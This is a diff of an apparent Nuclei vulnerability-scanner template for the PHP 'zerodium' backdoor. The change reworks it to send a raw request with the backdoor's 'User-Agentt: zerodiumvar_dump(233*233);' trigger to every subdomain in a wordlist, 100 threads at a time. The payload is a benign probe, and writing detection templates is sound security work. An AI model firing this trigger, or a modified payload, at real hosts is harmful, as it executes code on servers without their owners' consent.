@@ -8,13 +8,18 @@ info:
   tags: php,backdoor
 
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}"
+  - payloads:
+      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
+    attack: sniper
+    threads: 100
 
-    headers:
-      User-Agent: zerodiumvar_dump(233*233);
-
+    raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Subdomains}}
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        User-Agentt: zerodiumvar_dump(233*233);
     matchers-condition: and
     matchers:
 
